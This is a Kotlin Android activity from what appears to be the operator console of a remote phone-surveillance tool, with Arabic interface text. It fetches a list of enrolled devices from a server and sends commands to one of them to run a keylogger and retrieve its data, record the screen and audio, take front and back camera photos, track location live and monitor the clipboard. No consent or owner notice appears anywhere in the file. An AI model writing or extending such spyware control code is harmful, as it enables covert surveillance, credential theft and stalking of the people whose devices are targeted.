package com.abuzahra.admin.ui.monitor

import android.os.Bundle
import android.util.Log
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.abuzahra.admin.R
import com.abuzahra.admin.data.api.SendCommandRequest
import com.abuzahra.admin.databinding.ActivityMonitorBinding
import com.abuzahra.admin.util.Preferences
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import kotlinx.coroutines.launch
import java.net.SocketTimeoutException
import java.net.UnknownHostException

class MonitorActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MonitorActivity"
    }

    private lateinit var binding: ActivityMonitorBinding
    private var selectedDeviceId: String = ""

    // Debug log
    private lateinit var debugLogText: TextView
    private lateinit var debugLogScroll: ScrollView
    private val debugLogs = mutableListOf<String>()

    private fun addLog(msg: String) {
        val timestamp = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US)
            .format(java.util.Date())
        val entry = "[$timestamp] $msg"
        Log.d(TAG, entry)
        debugLogs.add(0, entry)
        if (debugLogs.size > 30) debugLogs.removeRange(30, debugLogs.size)
        val sb = StringBuilder()
        for (log in debugLogs) sb.append(log).append("\n")
        debugLogText.text = sb.toString()
        debugLogScroll.post { debugLogScroll.scrollTo(0, 0) }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMonitorBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupDebugLog()
        setupToolbar()
        loadDeviceAndSetup()
    }

    private fun setupDebugLog() {
        val rootLayout = binding.root as? LinearLayout ?: return
        debugLogScroll = ScrollView(this).apply {
            isVerticalScrollBarEnabled = true
            setBackgroundColor(ContextCompat.getColor(this@MonitorActivity, R.color.surface))
            setPadding(16, 8, 16, 8)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                200
            )
        }
        debugLogText = TextView(this).apply {
            textSize = 11f
            typeface = android.graphics.Typeface.MONOSPACE
            setTextColor(ContextCompat.getColor(this@MonitorActivity, R.color.text_primary))
        }
        debugLogScroll.addView(debugLogText)
        rootLayout.addView(debugLogScroll)
        addLog("الخادم: ${Preferences.getInstance(this).serverUrl}")
    }

    private fun setupToolbar() {
        setSupportActionBar(binding.toolbar)
        supportActionBar?.title = "المراقبة"
        supportActionBar?.setDisplayHomeAsUpEnabled(true)
        binding.toolbar.setNavigationOnClickListener { finish() }
    }

    private fun loadDeviceAndSetup() {
        lifecycleScope.launch {
            try {
                val api = Preferences.getInstance(this@MonitorActivity).getApiService()
                val devices = api.getDevices()
                addLog("✅ تم تحميل ${devices.size} جهاز")
                if (devices.isNotEmpty()) {
                    val firstOnline = devices.firstOrNull { it.isOnline } ?: devices.first()
                    selectedDeviceId = firstOnline.id
                    binding.tvSelectedDevice.text = "الجهاز: ${firstOnline.name.ifEmpty { firstOnline.model }}"
                    addLog("الجهاز المحدد: ${firstOnline.name.ifEmpty { firstOnline.model }} (${if (firstOnline.isOnline) "متصل" else "غير متصل"})")
                } else {
                    binding.tvSelectedDevice.text = "لا توجد أجهزة"
                    addLog("⚠️ لا توجد أجهزة")
                    return@launch
                }
            } catch (e: Exception) {
                addLog("❌ فشل تحميل الأجهزة: ${e.message}")
            }

            // ⚠️ Keys MUST match server COMMAND_REGISTRY exactly!
            // Keylogger
            binding.btnStartKeylogger.setOnClickListener { sendMonitorCommand("keylogger_start", "بدء تسجيل المفاتيح") }
            binding.btnStopKeylogger.setOnClickListener { sendMonitorCommand("keylogger_stop", "إيقاف تسجيل المفاتيح") }
            binding.btnGetKeylogData.setOnClickListener { sendMonitorCommand("get_keylogger", "بيانات تسجيل المفاتيح") }

            // Screen Record
            binding.btnStartScreenRecord.setOnClickListener { sendMonitorCommand("screen_record_start", "بدء تسجيل الشاشة") }
            binding.btnStopScreenRecord.setOnClickListener { sendMonitorCommand("screen_record_stop", "إيقاف تسجيل الشاشة") }

            // Audio Record (uses control category command)
            binding.btnStartAudioRecord.setOnClickListener { sendMonitorCommand("record_audio", "بدء تسجيل الصوت") }

            // Camera Capture (uses control category commands)
            binding.btnStartCameraCapture.setOnClickListener { sendMonitorCommand("front_camera", "التقاط صورة أمامية") }
            binding.btnStopCameraCapture.setOnClickListener { sendMonitorCommand("back_camera", "التقاط صورة خلفية") }

            // Location Tracking
            binding.btnStartLocationLive.setOnClickListener { sendMonitorCommand("location_live", "بدء تتبع الموقع") }
            binding.btnStopLocationLive.setOnClickListener { sendMonitorCommand("location_stop", "إيقاف تتبع الموقع") }

            // Clipboard Monitor
            binding.btnStartClipboardMonitor.setOnClickListener { sendMonitorCommand("clipboard_monitor_start", "بدء مراقبة الحافظة") }
            binding.btnStopClipboardMonitor.setOnClickListener { sendMonitorCommand("clipboard_monitor_stop", "إيقاف مراقبة الحافظة") }
        }
    }

    private fun sendMonitorCommand(command: String, name: String) {
        if (selectedDeviceId.isBlank()) {
            addLog("❌ لا يوجد جهاز محدد")
            return
        }
        lifecycleScope.launch {
            addLog("📦 إرسال: [$command] ($name) → $selectedDeviceId")
            try {
                val api = Preferences.getInstance(this@MonitorActivity).getApiService()
                val response = api.sendCommand(selectedDeviceId, SendCommandRequest(command))
                if (response.ok) {
                    addLog("✅ تم إرسال [$command] بنجاح")
                } else {
                    addLog("❌ فشل [$command]: ${response.message}")
                }
                MaterialAlertDialogBuilder(this@MonitorActivity)
                    .setTitle(name)
                    .setMessage(
                        if (response.ok) "✅ تم إرسال الأمر بنجاح\n\nالأمر: $command"
                        else "❌ فشل: ${response.message}\n\nالأمر: $command"
                    )
                    .setPositiveButton("حسناً", null)
                    .show()
            } catch (e: SocketTimeoutException) {
                addLog("❌ مهلة الاتصال")
                showError("انتهت مهلة الاتصال بالخادم")
            } catch (e: UnknownHostException) {
                addLog("❌ لا يمكن الوصول للخادم")
                showError("لا يمكن الوصول إلى الخادم")
            } catch (e: retrofit2.HttpException) {
                addLog("❌ خطأ HTTP ${e.code()}")
                showError("خطأ الخادم: HTTP ${e.code()}")
            } catch (e: Exception) {
                addLog("❌ خطأ: ${e.javaClass.simpleName}: ${e.message}")
                showError("خطأ: ${e.message}")
            }
        }
    }

    private fun showError(msg: String) {
        MaterialAlertDialogBuilder(this)
            .setTitle("خطأ")
            .setMessage(msg)
            .setPositiveButton("حسناً", null)
            .show()
    }
}